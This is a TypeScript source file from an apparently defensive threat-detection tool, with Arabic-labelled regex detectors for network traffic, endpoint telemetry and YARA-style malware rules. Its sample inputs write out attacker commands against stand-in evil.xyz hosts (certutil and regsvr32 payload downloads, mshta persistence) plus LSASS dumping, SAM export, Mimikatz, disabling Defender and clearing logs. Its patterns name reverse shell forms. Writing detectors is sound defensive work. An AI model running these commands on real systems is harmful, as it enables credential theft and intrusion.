    { re: /\bsmb\b.*\b(445|139)\b.*\b(3\.|10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.)/i, sev: 'HIGH', label: 'SMB scanning على الشبكة الداخلية' },
    { re: /ssh.*(\d{1,3}\.){3}\d{1,3}.*FORWARD|ssh.*tunnel.*forward/i,  sev: 'HIGH', label: 'SSH Tunneling — تمرير حركة مشبوه' },
    { re: /rdp.*(\b(\d{1,3}\.){3}\d{1,3}:\d{4,5})\b/i,                  sev: 'HIGH', label: 'RDP scan أو اتصال إلى IP داخلي' },
    { re: /kerberoasting|pass.*the.*hash|pass.*the.*ticket/i,            sev: 'CRITICAL', label: 'Kerberos attack مكتشف' },
    { re: /mimikatz.*net.*use|impacket/i,                                  sev: 'CRITICAL', label: 'Impacket toolkit في حركة الشبكة' },
  ];

  // ── Protocol Anomalies ──
  const PROTOCOL_ANOMALIES = [
    { re: /\bICMP\b.*data.*[1-9]\d{3,}/i,                                sev: 'HIGH', label: 'ICMP payload كبير — ICMP tunneling محتمل' },
    { re: /non-standard.*port.*\b(22|80|443|53)\b.*traffic/i,            sev: 'MEDIUM', label: 'حركة بروتوكول على منفذ غير معتاد' },
    { re: /\bTCP\b.*SYN\b.*flood|\bSYN\b.*\d{3,}\/s/i,                  sev: 'HIGH', label: 'TCP SYN flood — DoS attack' },
    { re: /\bUDP\b.*amplification|\bNTP\b.*monlist/i,                    sev: 'CRITICAL', label: 'DDoS Amplification attack' },
    { re: /cleartext.*password|plain.*password.*\bFTP\b|\bTELNET\b/i,   sev: 'HIGH', label: 'كلمة مرور نص صريح عبر بروتوكول غير مشفر' },
    { re: /ssl.*tls.*weak|rc4|ssl.*v2|ssl.*v3/i,                         sev: 'HIGH', label: 'بروتوكول TLS ضعيف — MITM محتمل' },
  ];

  // ── Scanning / Reconnaissance ──
  const RECON_PATTERNS = [
    { re: /nmap|masscan|zmap|\bshodan\b/i,                               sev: 'HIGH', label: 'أداة network scanning مكتشفة' },
    { re: /\bSYN\b.*scan|stealth.*scan|idle.*scan/i,                     sev: 'HIGH', label: 'Port scanning نشاط' },
    { re: /banner.*grab|\btelnet\b.*\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+/i, sev: 'MEDIUM', label: 'Banner grabbing — استطلاع خدمات' },
    { re: /\bOSCP\b|\bMS17-010\b|\bEternalBlue\b/i,                      sev: 'CRITICAL', label: 'Exploit معروف في حركة الشبكة' },
    { re: /\bsqlmap\b|\bnikto\b|\bburpsuite\b|\bowasp\s*zap\b/i,        sev: 'HIGH', label: 'Web scanning tool مكتشف' },
  ];

  // Parse Tshark text output
  function parseTsharkOutput(input: string) {
    const connections = [];
    const tsharkLineRe = /(\d+\.\d+)\s+(\S+)\s+→\s+(\S+)\s+(\w+)\s+(\d+)\s+(.*)/;
    const lines = input.split('\n');

    for (const line of lines) {
      const m = line.match(tsharkLineRe);
      if (m) connections.push({ time: m[1], src: m[2], dst: m[3], proto: m[4], len: parseInt(m[5]), info: m[6] });
    }

    // C2 beacon detection: look for regular intervals to same destination
    const destFreq: Record<string, number[]> = {};
    connections.forEach(c => {
      if (!destFreq[c.dst]) destFreq[c.dst] = [];
      destFreq[c.dst].push(parseFloat(c.time));
    });

    const beaconDests = Object.entries(destFreq)
      .filter(([, times]) => times.length >= 3)
      .map(([dst, times]) => {
        times.sort((a, b) => a - b);
        const intervals = times.slice(1).map((t, i) => t - times[i]);
        const avg = intervals.reduce((a, b) => a + b, 0) / intervals.length;
        const variance = intervals.reduce((a, b) => a + Math.pow(b - avg, 2), 0) / intervals.length;
        const stddev = Math.sqrt(variance);
        return { dst, count: times.length, avgInterval: avg.toFixed(1), regularity: (1 - stddev / avg).toFixed(2) };
      })
      .filter(r => parseFloat(r.regularity) > 0.7 && parseFloat(r.avgInterval) > 5);

    return { connections, beaconDests };
  }

  function analyze(input: string) {
    const findings = [];
    let score = 0;

    const check = (patterns) => {
      for (const p of patterns) {
        if (p.re.test(input)) {
          findings.push({ sev: p.sev, label: p.label, det: 'نمط مكتشف في حركة الشبكة', ev: (input.match(p.re) || [''])[0].slice(0, 120) });
          score += { CRITICAL: 10, HIGH: 6, MEDIUM: 3, LOW: 1 }[p.sev] || 0;
        }
      }
    };

    check(BEACON_PATTERNS);
    check(DNS_TUNNEL_PATTERNS);
    check(EXFIL_PATTERNS);
    check(LATERAL_MOVEMENT);
    check(PROTOCOL_ANOMALIES);
    check(RECON_PATTERNS);

    // Check for known bad IPs
    const ipMatches = input.match(/\b(?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\b/g) || [];
    const badIPs = ipMatches.filter(ip => KNOWN_BAD_IPS.has(ip));
    if (badIPs.length > 0) {
      score += 15;
      findings.push({ sev: 'CRITICAL', label: `${badIPs.length} عنوان IP خبيث معروف`, det: 'IPs مدرجة في قوائم Tor exit/C2 المعروفة', ev: badIPs.slice(0, 5).join(', ') });
    }

    // Parse Tshark output for beacon detection
    const tsharkData = parseTsharkOutput(input);
    if (tsharkData.beaconDests.length > 0) {
      score += 12;
      tsharkData.beaconDests.forEach(b => {
        findings.push({ sev: 'HIGH', label: `C2 Beacon محتمل إلى ${b.dst}`, det: `${b.count} اتصال بفاصل زمني منتظم ${b.avgInterval}s — معامل الانتظام: ${b.regularity}`, ev: '' });
      });
    }

    // Stats
    const stats = {
      totalPackets: (input.match(/^\s*\d+\s+\d+\.\d+/gm) || []).length || null,
      uniqueIPs: new Set(ipMatches).size,
      badIPs: badIPs.length,
      beaconTargets: tsharkData.beaconDests.length,
    };

    const pct = Math.min(Math.round((score / 70) * 100), 99);
    const threat = pct >= 65 ? 'crit' : pct >= 30 ? 'warn' : 'safe';

    return { pct, threat, findings, stats };
  }

  const SAMPLE = `Tshark output — suspect_capture.pcap
No. Time        Source          Destination     Protocol Len   Info
1   0.000000    192.168.1.10    185.220.101.45  TCP      66     SYN → 4444
2   0.082341    185.220.101.45  192.168.1.10    TCP      66     SYN-ACK
3   0.082400    192.168.1.10    185.220.101.45  TCP      54     ACK
4   0.100000    192.168.1.10    185.220.101.45  HTTP     412    POST /update HTTP/1.1
5   60.101234   192.168.1.10    185.220.101.45  HTTP     412    POST /update HTTP/1.1
6   120.102100  192.168.1.10    185.220.101.45  HTTP     412    POST /update HTTP/1.1

DNS queries:
7   0.500000    192.168.1.10    8.8.8.8         DNS      89     query aGVsbG8gd29ybGQgdGVzdA==.evil-domain.xyz TXT
8   0.510000    8.8.8.8         192.168.1.10    DNS      120    response TXT "c2FtcGxlIGJhc2U2NCBkYXRhIGluIEROUw=="

User-Agent: Mozilla/5.0 (compatible;)
EternalBlue exploit traffic detected on SMB port 445
psexec lateral movement: 192.168.1.10 → 192.168.1.20
cleartext password detected over FTP: USER admin / PASS admin123`;

  return { analyze, SAMPLE };
})();


// ═══════════════════════════════════════════════════════════════
// MOD-14 — ENDPOINT TELEMETRY ANALYZER (Velociraptor-inspired)
// محلل تلمترية نقاط النهاية
// ═══════════════════════════════════════════════════════════════
export const EndpointEngine = (() => {

  // ── Persistence Mechanisms ──
  const PERSISTENCE_PATTERNS = [
    { re: /HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run/i,       sev: 'HIGH',     label: 'Registry Run Key — استمرارية عند تسجيل الدخول' },
    { re: /HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run/i,       sev: 'CRITICAL', label: 'Registry Run Key (HKLM) — استمرارية على كل المستخدمين' },
    { re: /schtasks.*\/create|at\.exe\s+\d+:\d+/i,                          sev: 'HIGH',     label: 'Scheduled Task مُجدوَل — استمرارية عبر المهام' },
    { re: /sc\s+create|New-Service|sc\.exe\s+config/i,                      sev: 'HIGH',     label: 'Windows Service جديد — استمرارية عبر الخدمات' },
    { re: /\\Startup\\\S+\.exe|\\StartMenu\\Programs\\Startup/i,            sev: 'HIGH',     label: 'Startup Folder — ملف تنفيذي في مجلد البدء' },
    { re: /DLL\s+hijack|dll.*hijacking|search.*order.*hijack/i,             sev: 'CRITICAL', label: 'DLL Hijacking — استبدال مكتبة شرعية' },
    { re: /winlogon.*notify|IFEO.*debugger/i,                                sev: 'CRITICAL', label: 'Winlogon Hijack / IFEO — تلاعب في تسلسل بدء التشغيل' },
    { re: /\/etc\/cron\.|crontab.*-l|\/etc\/rc\.local/i,                    sev: 'HIGH',     label: 'Linux Cron job — استمرارية على Linux' },
    { re: /~\/\.bashrc|~\/\.profile|~\/\.bash_profile/i,                    sev: 'MEDIUM',   label: 'Shell Profile modification — استمرارية Linux/Mac' },
    { re: /WMI.*subscription|__EventFilter.*__CommandLineEventConsumer/i,   sev: 'CRITICAL', label: 'WMI Event Subscription — استمرارية متقدمة' },
  ];

  // ── Privilege Escalation ──
  const PRIVESC_PATTERNS = [
    { re: /\bUAC\s*bypass\b|eventvwr.*hijack|fodhelper/i,                  sev: 'CRITICAL', label: 'UAC Bypass — تجاوز التحكم في حساب المستخدم' },
    { re: /token.*impersonate|SeImpersonatePrivilege|SeDebugPrivilege/i,   sev: 'CRITICAL', label: 'Token Impersonation — انتحال صلاحيات رفيعة' },
    { re: /print.*spoofer|printspoofer|SpoolFool/i,                        sev: 'CRITICAL', label: 'PrintSpoofer — رفع الصلاحيات عبر Print Spooler' },
    { re: /juicy.*potato|rotten.*potato|sweet.*potato/i,                   sev: 'CRITICAL', label: 'Potato exploit — رفع الصلاحيات' },
    { re: /sudo\s+-l|sudo.*NOPASSWD|sudoers.*ALL=\(ALL\)/i,               sev: 'HIGH',     label: 'Sudo misconfiguration — مسار رفع صلاحيات Linux' },
    { re: /exploit.*CVE-\d{4}-\d{4,}/i,                                   sev: 'CRITICAL', label: 'Kernel/Local exploit attempt' },
    { re: /AlwaysInstallElevated|msi.*elevated|msiexec.*\/qn/i,           sev: 'HIGH',     label: 'AlwaysInstallElevated — MSI رفع الصلاحيات' },
  ];

  // ── Credential Access ──
  const CRED_ACCESS_PATTERNS = [
    { re: /lsass\.exe.*dump|procdump.*lsass|task.*list.*lsass/i,          sev: 'CRITICAL', label: 'LSASS memory dump — سرقة بيانات الاعتماد' },
    { re: /reg\s+save\s+HKLM\\SAM|secretsdump|impacket.*secretsdump/i,   sev: 'CRITICAL', label: 'SAM hive extraction — تصدير قاعدة كلمات المرور' },
    { re: /ntds\.dit.*copy|vssadmin.*shadow|shadow.*copy.*ntds/i,         sev: 'CRITICAL', label: 'NTDS.dit extraction via VSS — Active Directory dump' },
    { re: /LaZagne|lazagne\.exe|credentialstore/i,                         sev: 'CRITICAL', label: 'LaZagne — أداة استخراج بيانات الاعتماد' },
    { re: /Get-Credential.*export|ConvertFrom-SecureString/i,             sev: 'HIGH',     label: 'PowerShell credential harvesting' },
    { re: /Invoke-Mimikatz|DumpCreds|DumpCerts/i,                          sev: 'CRITICAL', label: 'PowerShell Mimikatz — استخراج بيانات الاعتماد' },
    { re: /keylog|clipboard.*capture|screenshot.*capture/i,               sev: 'HIGH',     label: 'Keylogger / Screen capture — مراقبة المستخدم' },
  ];

  // ── Defense Evasion ──
  const EVASION_PATTERNS = [
    { re: /Set-MpPreference.*Disable|Add-MpPreference.*Exclusion/i,       sev: 'CRITICAL', label: 'تعطيل Windows Defender — التهرب من الحماية' },
    { re: /Stop-Service.*WinDefend|sc\s+stop\s+WinDefend/i,              sev: 'CRITICAL', label: 'إيقاف خدمة Windows Defender' },
    { re: /wevtutil\s+cl|Clear-EventLog|Remove-EventLog/i,               sev: 'CRITICAL', label: 'مسح سجلات الأحداث — إخفاء الآثار' },
    { re: /attrib\s+\+h|\bfileattribute.*hidden\b/i,                      sev: 'HIGH',     label: 'إخفاء ملف — تغيير Attribute' },
    { re: /certutil.*-decode|\bDeobfuscat/i,                              sev: 'HIGH',     label: 'Certutil decode — فك ترميز payload' },
    { re: /invoke-obfuscation|obfuscate.*powershell/i,                    sev: 'HIGH',     label: 'PowerShell Obfuscation tool' },
    { re: /\bEncodedCommand\b|-enc\s+[A-Za-z0-9+/]{20,}/i,              sev: 'HIGH',     label: 'PowerShell Encoded Command' },
    { re: /Bypass.*ExecutionPolicy|executionpolicy.*bypass/i,            sev: 'HIGH',     label: 'PowerShell Execution Policy Bypass' },
    { re: /Reflection\.Assembly.*Load|Add-Type.*\[byte\]/i,              sev: 'HIGH',     label: 'In-memory .NET assembly loading' },
  ];

  // ── LOLBins (Living Off The Land Binaries) ──
  const LOLBINS = [
    { re: /regsvr32\s+\/s\s+\/u\s+\/i:http/i,                            sev: 'CRITICAL', label: 'Regsvr32 Squiblydoo — تنفيذ COM Scriptlet' },
    { re: /mshta\s+https?:\/\//i,                                         sev: 'CRITICAL', label: 'MSHTA remote HTA — تنفيذ كود عبر HTTPS' },
    { re: /certutil\s+-urlcache\s+-f\s+https?:\/\//i,                    sev: 'CRITICAL', label: 'Certutil download — تحميل payload' },
    { re: /bitsadmin\s+\/transfer.*https?:\/\//i,                        sev: 'HIGH',     label: 'BITSAdmin download — تحميل ملف خبيث' },
    { re: /wmic.*process\s+call\s+create/i,                              sev: 'HIGH',     label: 'WMIC process execution — تنفيذ عملية عبر WMI' },
    { re: /rundll32.*javascript:|rundll32.*vbscript:/i,                  sev: 'CRITICAL', label: 'Rundll32 scripting — تجاوز whitelist' },
    { re: /installutil\s+\/logfile=\s*\/LogToConsole/i,                  sev: 'HIGH',     label: 'InstallUtil proxy execution' },
    { re: /odbcconf\s+\/s\s+\/a\s+\{REGSVR/i,                           sev: 'HIGH',     label: 'ODBCCONF proxy execution' },
    { re: /cmstp\s+\/s\s+\/ns\s+https?:\/\//i,                          sev: 'CRITICAL', label: 'CMSTP — تجاوز UAC وتنفيذ remote code' },
    { re: /expand\s+.*\.cab\s+.*dll/i,                                   sev: 'HIGH',     label: 'Expand.exe DLL extraction — LOLBin' },
  ];

  // ── Sysmon / Windows Event Log Patterns ──
  const SYSMON_PATTERNS = [
    { re: /EventID\s*[=:]\s*1\b.*Image.*\\(cmd|powershell|wscript|cscript|mshta)\.exe/i, sev: 'HIGH', label: 'Sysmon Event 1: Process Creation مشبوه' },
    { re: /EventID\s*[=:]\s*3\b.*DestinationPort.*\b(4444|31337|1337|8888)\b/i,          sev: 'CRITICAL', label: 'Sysmon Event 3: اتصال شبكي على منفذ خبيث' },
    { re: /EventID\s*[=:]\s*7\b.*Signature.*NOT VERIFIED|unsigned.*DLL/i,                 sev: 'HIGH',     label: 'Sysmon Event 7: DLL غير موقعة رقمياً' },
    { re: /EventID\s*[=:]\s*8\b.*SourceImage.*targetimage/i,                              sev: 'CRITICAL', label: 'Sysmon Event 8: CreateRemoteThread — Process Injection' },
    { re: /EventID\s*[=:]\s*10\b.*lsass\.exe/i,                                           sev: 'CRITICAL', label: 'Sysmon Event 10: LSASS access — credential theft' },
    { re: /EventID\s*[=:]\s*11\b.*TargetFilename.*\.(exe|dll|ps1|bat|vbs)/i,             sev: 'HIGH',     label: 'Sysmon Event 11: File created — ملف تنفيذي جديد' },
    { re: /EventID\s*[=:]\s*13\b.*HKLM.*Run/i,                                            sev: 'HIGH',     label: 'Sysmon Event 13: Registry persistence' },
    { re: /EventID\s*[=:]\s*4624\b.*LogonType.*3\b/i,                                    sev: 'MEDIUM',   label: 'Windows Event 4624: Network Logon — دخول شبكي' },
    { re: /EventID\s*[=:]\s*4625\b/i,                                                     sev: 'MEDIUM',   label: 'Windows Event 4625: Failed Logon — فشل تسجيل دخول' },
    { re: /EventID\s*[=:]\s*4688\b.*ProcessName.*\\(powershell|cmd)\.exe/i,              sev: 'HIGH',     label: 'Windows Event 4688: Process Creation (cmdline logging)' },
    { re: /EventID\s*[=:]\s*4698\b/i,                                                     sev: 'HIGH',     label: 'Windows Event 4698: Scheduled Task Created' },
    { re: /EventID\s*[=:]\s*4720\b/i,                                                     sev: 'HIGH',     label: 'Windows Event 4720: User Account Created' },
    { re: /EventID\s*[=:]\s*4732\b.*Administrators/i,                                    sev: 'CRITICAL', label: 'Windows Event 4732: Added to Administrators group' },
  ];

  // ── Velociraptor Artifact Patterns ──
  const VQL_ARTIFACTS = [
    { re: /SELECT\s+.*FROM\s+Windows\.(System|Network|Forensics)/i,       sev: 'INFO', label: 'VQL query — Velociraptor artifact' },
    { re: /artifact_name.*Windows\.(Persistence|Hunting|Triage)/i,       sev: 'INFO', label: 'Velociraptor Hunt artifact' },
    { re: /\bvelociraptor\b.*\bcollect\b|\bvql\b.*\bselect\b/i,          sev: 'INFO', label: 'Velociraptor collection output' },
    { re: /PsTree\s+PID.*PPID.*Name.*Cmdline/i,                           sev: 'INFO', label: 'Process tree dump (Velociraptor style)' },
  ];

  function analyze(input: string) {
    const findings = [];
    let score = 0;

    const check = (patterns) => {
      for (const p of patterns) {
        if (p.re.test(input)) {
          findings.push({ sev: p.sev, label: p.label, det: 'Pattern detected in endpoint telemetry', ev: (input.match(p.re) || [''])[0].slice(0, 120) });
          score += { CRITICAL: 10, HIGH: 6, MEDIUM: 3, LOW: 1, INFO: 0 }[p.sev] || 0;
        }
      }
    };

    check(PERSISTENCE_PATTERNS);
    check(PRIVESC_PATTERNS);
    check(CRED_ACCESS_PATTERNS);
    check(EVASION_PATTERNS);
    check(LOLBINS);
    check(SYSMON_PATTERNS);
    check(VQL_ARTIFACTS);

    // MITRE ATT&CK auto-mapping
    const mitreHints: string[] = [];
    if (findings.some(f => f.label.includes('Persistence') || f.label.includes('استمرارية'))) mitreHints.push('T1547 — Boot/Logon Autostart Execution');
    if (findings.some(f => f.label.includes('Credential') || f.label.includes('LSASS')))      mitreHints.push('T1003 — OS Credential Dumping');
    if (findings.some(f => f.label.includes('UAC') || f.label.includes('رفع الصلاحيات')))    mitreHints.push('T1548 — Abuse Elevation Control Mechanism');
    if (findings.some(f => f.label.includes('LOLBin') || f.label.includes('rundll')))         mitreHints.push('T1218 — System Binary Proxy Execution');
    if (findings.some(f => f.label.includes('Defender') || f.label.includes('تعطيل')))        mitreHints.push('T1562 — Impair Defenses');
    if (findings.some(f => f.label.includes('سجلات') || f.label.includes('EventLog')))        mitreHints.push('T1070 — Indicator Removal');
    if (findings.some(f => f.label.includes('WMI')))                                           mitreHints.push('T1047 — WMI');
    if (findings.some(f => f.label.includes('Scheduled')))                                    mitreHints.push('T1053 — Scheduled Task/Job');

    const stats = {
      totalFindings: findings.length,
      critical: findings.filter(f => f.sev === 'CRITICAL').length,
      high: findings.filter(f => f.sev === 'HIGH').length,
      persistenceIndicators: findings.filter(f => f.label.includes('استمرارية') || f.label.includes('Persist') || f.label.includes('Run Key')).length,
      credentialIndicators: findings.filter(f => f.label.includes('credential') || f.label.includes('LSASS') || f.label.includes('بيانات الاعتماد')).length,
      mitreMapping: mitreHints,
    };

    const pct = Math.min(Math.round((score / 80) * 100), 99);
    const threat = pct >= 65 ? 'crit' : pct >= 30 ? 'warn' : 'safe';

    return { pct, threat, findings, stats };
  }

  const SAMPLE = `=== Velociraptor Endpoint Collection Report ===
Artifact: Windows.Triage.ProcessMemory
Host: WORKSTATION-01  |  User: jdoe  |  Time: 2024-01-15 03:17:42 UTC

[Sysmon Events]
EventID = 1 | Image: C:\\Windows\\System32\\cmd.exe | CommandLine: cmd.exe /c powershell -enc JABjAGwAaQBlAG4AdAA=
EventID = 10 | SourceImage: svchost.exe | TargetImage: lsass.exe | GrantedAccess: 0x1010
EventID = 3 | Image: powershell.exe | DestinationIP: 185.220.101.45 | DestinationPort: 4444 | Initiated: true
EventID = 13 | TargetObject: HKLM\Software\Microsoft\Windows\CurrentVersion\Run | Details: C:\Users\jdoe\AppData\Local\Temp\payload.exe

[Registry Persistence]
HKCU\Software\Microsoft\Windows\CurrentVersion\Run → "updater" = "C:\Temp\svch0st.exe"
HKLM\Software\Microsoft\Windows\CurrentVersion\Run → "SecurityUpdate" = "mshta https://evil.xyz/a.hta"

[Process Tree]
PID=4521 explorer.exe
  PID=4892 powershell.exe -ExecutionPolicy Bypass -enc JABjAGwAaQBlAG4AdAA=
    PID=5012 cmd.exe /c certutil -urlcache -f https://evil.xyz/shell.exe C:\Temp\shell.exe
    PID=5089 regsvr32 /s /u /i:http://evil.xyz/payload.sct scrobj.dll

[Defense Evasion]
Set-MpPreference -DisableRealtimeMonitoring $true
wevtutil cl Security
wevtutil cl System
attrib +h C:\Temp\backdoor.exe

[Credential Access]
procdump.exe -accepteula -ma lsass.exe lsass.dmp
reg save HKLM\SAM C:\Temp\sam.hive
Invoke-Mimikatz -Command "sekurlsa::logonpasswords"

[Scheduled Task Created]
EventID = 4698 | TaskName: \Microsoft\Windows\UpdateAssistant
Action: C:\Temp\payload.exe /silent

Windows Event 4732: User jdoe added to Administrators group`;

  return { analyze, SAMPLE };
})();


// ═══════════════════════════════════════════════════════════════
// YARA ENGINE ENHANCEMENT — تعزيز محرك YARA في IOCEngine
// ═══════════════════════════════════════════════════════════════
// هذا الملف يُصدِّر قواعد YARA الإضافية التي تُدمَج مع IOCEngine الموجود
export const YaraEnhancement = (() => {

  // ── Extended YARA-like Rule Set ──
  // Rules follow Volatility/YARA naming conventions with TLP classification
  const YARA_RULES = [
    // ─── Malware Family Rules ───
    {
      name: 'DFAS_Cobalt_Strike_Beacon',
      category: 'RAT/C2',
      tlp: 'AMBER',
      sev: 'CRITICAL',
      description: 'Detects Cobalt Strike beacon artifacts',
      strings: [
        /\x2f\x2f\x20\x43\x6f\x62\x61\x6c\x74\x20\x53\x74\x72\x69\x6b\x65/,
        /beacon\.dll|cobaltstrike|CS\s+beacon/i,
        /sleep_mask|beacon_stage|reflective.*loader/i,
      ]
    },
    {
      name: 'DFAS_Mimikatz_Memory',
      category: 'CredentialTheft',
      tlp: 'RED',
      sev: 'CRITICAL',
      description: 'Detects Mimikatz in memory or logs',
      strings: [
        /sekurlsa::|kerberos::|lsadump::/i,
        /mimikatz|mimilib|mimidrv/i,
        /gentilkiwi|gentil kiwi/i,
      ]
    },
    {
      name: 'DFAS_PowerShell_Download_Cradle',
      category: 'Downloader',
      tlp: 'AMBER',
      sev: 'HIGH',
      description: 'Detects PowerShell download cradles',
      strings: [
        /\bIEX\b.*\bNew-Object\b.*\bNet\.WebClient\b/i,
        /Invoke-Expression.*DownloadString/i,
        /\(New-Object\s+System\.Net\.WebClient\)\.DownloadString/i,
        /\$env:TEMP.*Invoke-Expression/i,
      ]
    },
    {
      name: 'DFAS_Office_Macro_Dropper',
      category: 'Dropper/Macro',
      tlp: 'AMBER',
      sev: 'CRITICAL',
      description: 'Detects malicious Office macro patterns',
      strings: [
        /Auto(?:Open|Close|Exec)|Document_Open|Workbook_Open/i,
        /Shell\("cmd\.exe|CreateObject\("WScript\.Shell/i,
        /Chr\(\d+\)\s*&\s*Chr\(\d+\)|Asc\(.*XOR/i,
      ]
    },
    {
      name: 'DFAS_Ransomware_Generic',
      category: 'Ransomware',
      tlp: 'RED',
      sev: 'CRITICAL',
      description: 'Generic ransomware behavioral indicators',
      strings: [
        /YOUR\s+FILES\s+(HAVE\s+BEEN\s+)?ENCRYPTED|all\s+your\s+files.*encrypted/i,
        /bitcoin.*wallet.*ransom|pay.*BTC.*decrypt/i,
        /\.encrypted\b|\.locked\b|\.ryuk\b|\.locky\b|\.cerber\b/i,
        /vssadmin.*delete.*shadows|shadow\s+copy.*deleted/i,
      ]
    },
    {
      name: 'DFAS_WebShell_Generic',
      category: 'WebShell',
      tlp: 'AMBER',
      sev: 'CRITICAL',
      description: 'Detects common webshell patterns',
      strings: [
        /eval\s*\(\s*base64_decode|eval\s*\(\s*gzinflate/i,
        /system\s*\(\s*\$_(?:GET|POST|REQUEST|COOKIE)\s*\[/i,
        /passthru\s*\(\s*\$_(?:GET|POST)|shell_exec\s*\(\s*\$/i,
        /\$_FILES\[.*\]\s*\['tmp_name'\].*move_uploaded_file/i,
      ]
    },
    {
      name: 'DFAS_Reverse_Shell',
      category: 'C2/Shell',
      tlp: 'RED',
      sev: 'CRITICAL',
      description: 'Detects common reverse shell patterns',
      strings: [
        /bash\s+-i\s+>&\s*\/dev\/tcp\//i,
        /python.*socket.*SOCK_STREAM.*connect.*subprocess/i,
        /nc\s+-e\s+\/bin\/(ba)?sh|ncat\s+.*-e\s+\/bin/i,
        /0>&1|2>&1.*connect.*\/dev\/tcp/i,
      ]
    },
    {
      name: 'DFAS_SQL_Injection_Exfil',
      category: 'Injection/Exfiltration',
      tlp: 'AMBER',
      sev: 'HIGH',
      description: 'SQL injection with data exfiltration patterns',
      strings: [
        /UNION\s+SELECT.*information_schema/i,
        /INTO\s+OUTFILE\s+'\/|xp_cmdshell/i,
        /LOAD_FILE\s*\(|BENCHMARK\s*\(\d+/i,
      ]
    },
    {
      name: 'DFAS_Cryptocurrency_Miner',
      category: 'Cryptominer',
      tlp: 'AMBER',
      sev: 'HIGH',
      description: 'Detects cryptocurrency miner indicators',
      strings: [
        /stratum\+tcp:\/\/|xmrig|monero.*miner/i,
        /cryptonight|hashrate.*H\/s/i,
        /pool\.minexmr\.com|supportxmr\.com|nanopool\.org/i,
      ]
    },
  ];

  function scan(input: string) {
    const hits = [];

    for (const rule of YARA_RULES) {
      const matched = rule.strings.some(pattern => pattern.test(input));
      if (matched) {
        const matchedStrings = rule.strings.filter(p => p.test(input)).map(p => (input.match(p) || [''])[0].slice(0, 80));
        hits.push({
          rule: rule.name,
          category: rule.category,
          sev: rule.sev,
          tlp: rule.tlp,
          description: rule.description,
          matchedStrings,
        });
      }
    }

    return hits;
  }

  return { scan, YARA_RULES };
})();
